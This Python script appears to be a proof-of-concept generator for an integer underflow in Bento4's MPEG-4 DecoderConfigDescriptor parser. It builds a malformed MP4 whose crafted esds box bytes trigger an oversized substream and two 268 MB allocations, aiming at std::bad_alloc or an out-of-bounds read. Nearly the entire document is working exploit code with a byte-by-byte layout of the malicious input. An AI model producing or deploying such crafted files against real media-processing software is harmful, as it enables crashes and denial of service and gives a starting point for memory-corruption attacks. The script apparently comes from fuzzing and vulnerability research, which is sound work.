#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Underflow in AP4_DecoderConfigDescriptor
creates an oversize SubStream leading to OOB Read / bad_alloc.

The vulnerability is in:
  AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(stream, header_size, payload_size)

Vulnerable line:
  AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);

When payload_size < 13, the unsigned subtraction underflows, e.g.:
  payload_size=5  -> 5 - 13 = 0xFFFFFFF8  (AP4_Size is uint32)

This creates a SubStream with size ~4GB. The descriptor factory loop inside the
SubStream then parses whatever bytes follow in the stream as descriptors.

Key design insight:
  - DecoderConfig constructor unconditionally reads 13 bytes from the stream.
  - With payload_size=5, bytes 6-13 come from OUTSIDE the declared region.
  - We structure those extra bytes to serve double duty:
      a) They form maxBitrate and avgBitrate field values inside the constructor.
      b) When the outer ES_Descriptor descriptor loop resumes (seeking to
         offset+header_size+payload_size = position 7 in the ES substream),
         it encounters these same bytes beginning at position 7, where
         0x05 = tag for DecoderSpecificInfo and the following 0xFF 0xFF 0xFF 0x7F
         encodes an expandable size of 0x0FFFFFFF (268 MB).
  - The inner SubStream (starting at position 15 in the ES substream) also
    contains a second 268 MB DSI descriptor, so two independent 268 MB
    allocations are attempted.  Combined (536 MB) this is far more likely to
    trigger std::bad_alloc / ASAN termination.

Byte layout of the ES substream (inside ES_Descriptor, after ES_ID+flags):
  [0]    0x04        DecoderConfig tag
  [1]    0x05        DecoderConfig declared payload_size = 5
  [2]    0x40        objectTypeIndication          (payload byte 1)
  [3]    0x15        streamType | upStream bits    (payload byte 2)
  [4]    0x00        bufferSize byte 1             (payload byte 3)
  [5]    0x00        bufferSize byte 2             (payload byte 4)
  [6]    0x00        bufferSize byte 3             (payload byte 5)  <- end declared
  [7]    0x05        maxBitrate byte 0 (greedy)  = tag 0x05 for outer loop
  [8]    0xFF        maxBitrate byte 1            = expandable size byte 1
  [9]    0xFF        maxBitrate byte 2            = expandable size byte 2
  [10]   0xFF        maxBitrate byte 3            = expandable size byte 3
  [11]   0x7F        avgBitrate byte 0 (greedy)  = expandable size byte 4 (end)
                       -> outer-loop payload_size = 0x0FFFFFFF = 268 MB
  [12]   0x00        avgBitrate byte 1
  [13]   0x00        avgBitrate byte 2
  [14]   0x00        avgBitrate byte 3  <- inner SubStream starts at [15]
  [15]   0x05        2nd fake DSI tag  (inner SubStream position 0)
  [16]   0xFF        expandable size byte 1
  [17]   0xFF        expandable size byte 2
  [18]   0xFF        expandable size byte 3
  [19]   0x7F        expandable size byte 4 -> inner payload_size = 268 MB
  [20]   0xDE ...    dummy data inside fake DSI payload
  ...
  [N]    0x06 0x01 0x02   SLConfigDescriptor

Trigger sequence:
  1. Inner SubStream loop creates AP4_DecoderSpecificInfoDescriptor(268 MB)
     -> allocates 268 MB; read returns EOS quickly; descriptor held in list.
  2. Outer ES loop seeks to position 7 and sees same 0x05 / 268 MB descriptor.
     -> allocates another 268 MB (536 MB live simultaneously).
  3. Either allocation can fail with std::bad_alloc -> crash observable by ASAN.
     On systems with >600 MB free the process completes without crash
     (UNVERIFIED result) but the integer underflow still occurs.
"""

import struct
import os

OUTPUT_DIR = (
    "/data/ylwang/non-textfuzz/target/_poc/"
    "Bento4/Source_C++_Core_Ap4DescriptorFactory_h"
)
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def pack_box(box_type: str, data: bytes) -> bytes:
    """Build an ISO base media file format box: size(4B BE) + type(4B) + data."""
    size = 8 + len(data)
    return struct.pack(">I4s", size, box_type.encode("ascii")) + data


def expandable_size(n: int) -> bytes:
    """Encode n as an MPEG-4 expandable size (big-endian, variable-length)."""
    if n < 0x80:
        return bytes([n])
    result = []
    while n > 0x7F:
        result.append((n & 0x7F) | 0x80)
        n >>= 7
    result.append(n)
    return bytes(reversed(result))


def descriptor(tag: int, data: bytes) -> bytes:
    """Build a descriptor: tag(1B) + expandable_size + data."""
    return bytes([tag]) + expandable_size(len(data)) + data


def build_esds() -> bytes:
    """
    Build a malicious esds box.

    The ES substream (after ES_ID and flags) contains:
      - DecoderConfig (tag=0x04, declared payload=5 bytes)
        with carefully chosen extra bytes at positions 7-14 that serve as
        field data for the greedy 13-byte constructor read AND simultaneously
        as a fake 268 MB DSI descriptor for the outer ES loop.
      - A second fake 268 MB DSI descriptor visible to the inner SubStream
        (whose offset is start+13 = position 15 in the ES substream).
      - SLConfigDescriptor.
    """

    # Positions 0-14 inside the ES substream (tag+size+payload+greedy reads):
    decoder_config_block = bytes([
        # tag and declared size
        0x04,                    # [0] DecoderConfig tag
        0x05,                    # [1] declared payload_size = 5 (< 13, triggers underflow)

        # 5 declared payload bytes (positions 2-6):
        0x40,                    # [2] objectTypeIndication = 0x40 (Audio 14496-3)
        0x15,                    # [3] streamType=5, upStream=0, reserved=1
        0x00, 0x00, 0x00,        # [4-6] bufferSize = 0

        # 8 bytes consumed greedily for maxBitrate+avgBitrate (positions 7-14):
        # These bytes also decode as the outer-loop fake DSI descriptor:
        #   tag=0x05, expandable_size=0xFF 0xFF 0xFF 0x7F (=0x0FFFFFFF, 268 MB)
        0x05,                    # [7]  maxBitrate[0]  / outer-loop DSI tag
        0xFF,                    # [8]  maxBitrate[1]  / size byte 1
        0xFF,                    # [9]  maxBitrate[2]  / size byte 2
        0xFF,                    # [10] maxBitrate[3]  / size byte 3
        0x7F,                    # [11] avgBitrate[0]  / size byte 4 -> 268 MB
        0x00,                    # [12] avgBitrate[1]
        0x00,                    # [13] avgBitrate[2]
        0x00,                    # [14] avgBitrate[3]

        # Inner SubStream begins at position 15.
        # A second 268 MB fake DSI for the inner descriptor loop:
        0x05,                    # [15] inner-loop DSI tag
        0xFF,                    # [16] inner size byte 1
        0xFF,                    # [17] inner size byte 2
        0xFF,                    # [18] inner size byte 3
        0x7F,                    # [19] inner size byte 4 -> 268 MB
        # A few padding bytes as "payload":
        0xDE, 0xAD, 0xBE, 0xEF, # [20-23]
    ])

    # SLConfigDescriptor (required for a well-formed ES_Descriptor):
    sl_config = bytes([0x06, 0x01, 0x02])   # tag=0x06, size=1, predefined=0x02

    # ES_Descriptor payload:
    es_id    = struct.pack(">H", 0x0001)    # ES_ID = 1
    es_flags = bytes([0x00])                # no stream dependency, no URL, no OCR
    es_payload = es_id + es_flags + decoder_config_block + sl_config

    es_desc = descriptor(0x03, es_payload)

    # esds box: version/flags (4 bytes = 0) + descriptor(s)
    esds_body = struct.pack(">I", 0x00000000) + es_desc
    return pack_box("esds", esds_body)


def build_mp4() -> bytes:
    """Build a minimal MP4 routed through moov/trak/mdia/minf/stbl/stsd/mp4a/esds."""

    esds = build_esds()

    # mp4a sample entry (ISO 14496-14 §5.6)
    mp4a_body = (
        bytes(6)                          # reserved
        + struct.pack(">H", 1)            # data-reference-index
        + bytes(8)                         # reserved
        + struct.pack(">H", 2)            # channel count
        + struct.pack(">H", 16)           # sample size (bits)
        + struct.pack(">H", 0)            # pre-defined
        + struct.pack(">H", 0)            # reserved
        + struct.pack(">HH", 44100, 0)   # sample rate (16.16 fixed point)
        + esds
    )
    mp4a = pack_box("mp4a", mp4a_body)

    stsd = pack_box("stsd", struct.pack(">II", 0, 1) + mp4a)
    stts = pack_box("stts", struct.pack(">II", 0, 0))
    stbl = pack_box("stbl", stsd + stts)

    dref = pack_box("dref",
                    struct.pack(">II", 0, 1)
                    + pack_box("url ", struct.pack(">I", 1)))
    dinf = pack_box("dinf", dref)
    smhd = pack_box("smhd", struct.pack(">IHH", 0, 0, 0))
    minf = pack_box("minf", smhd + dinf + stbl)

    mdhd = pack_box("mdhd",
                    struct.pack(">IIIIIIH", 0, 0, 0, 44100, 0, 0x55C4, 0))
    hdlr = pack_box("hdlr",
                    struct.pack(">II4s", 0, 0, b"soun") + bytes(12) + b"\x00")
    mdia = pack_box("mdia", mdhd + hdlr + minf)

    tkhd = pack_box("tkhd",
                    struct.pack(">IIIIIII", 3, 0, 0, 1, 0, 0, 0)
                    + bytes(8)
                    + struct.pack(">II", 0, 0)
                    + struct.pack(">iiiiiiii",
                                  0x00010000, 0, 0,
                                  0, 0x00010000, 0,
                                  0, 0, )
                    + struct.pack(">i", 0x40000000))
    trak = pack_box("trak", tkhd + mdia)

    mvhd = pack_box("mvhd",
                    struct.pack(">IIIII", 0, 0, 0, 44100, 0)
                    + struct.pack(">ih", 0x00010000, 0x0100)
                    + bytes(10)
                    + struct.pack(">iiiiiiiii",
                                  0x00010000, 0, 0,
                                  0, 0x00010000, 0,
                                  0, 0, 0x40000000)
                    + bytes(24)
                    + struct.pack(">I", 2))
    moov = pack_box("moov", mvhd + trak)

    ftyp = pack_box("ftyp",
                    b"M4A " + struct.pack(">I", 0) + b"M4A " + b"mp42" + b"isom")
    mdat = pack_box("mdat", b"")

    return ftyp + moov + mdat


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    mp4_data = build_mp4()
    with open(OUTPUT_FILE, "wb") as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] Malicious esds structure:")
    print(f"    DecoderConfig tag=0x04, declared payload_size=5 (< 13)")
    print(f"    Integer underflow: 5 - 13 = 0xFFFFFFF8 (SubStream size)")
    print(f"    Outer ES loop DSI at esds position 7: tag=0x05, size=0x0FFFFFFF (268MB)")
    print(f"    Inner SubStream DSI at esds position 15: tag=0x05, size=0x0FFFFFFF (268MB)")
    print(f"    Expected: std::bad_alloc or OOB read from 268MB+ allocation attempt")


if __name__ == "__main__":
    main()
